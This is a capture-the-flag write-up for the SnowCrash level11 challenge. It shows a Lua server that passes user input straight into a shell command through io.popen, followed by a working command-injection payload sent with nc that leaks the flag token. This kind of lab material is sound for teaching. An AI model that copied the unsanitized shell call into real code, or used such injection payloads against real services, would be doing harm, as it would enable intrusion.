# Snow-crash - level11

* First we have a lua script, seems to be a server running and listening on 5151 port
    - *prog = io.popen("echo "..pass.." | sha1sum", "r")* in hash function use shell command
```lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
* When we try to launch it, the program specifies that the server is running, and when connecting to the server it asks for a *Password*
```bash
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: hi
Erf nope..
```
* Let's try to inject shell and that works
```bash
level11@SnowCrash:~$ echo ';$(getflag | wall)' | nc 127.0.0.1 5151

Broadcast Message from flag11@Snow                                             
        (somewhere) at 11:07 ...                                               

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      

Erf nope..
```
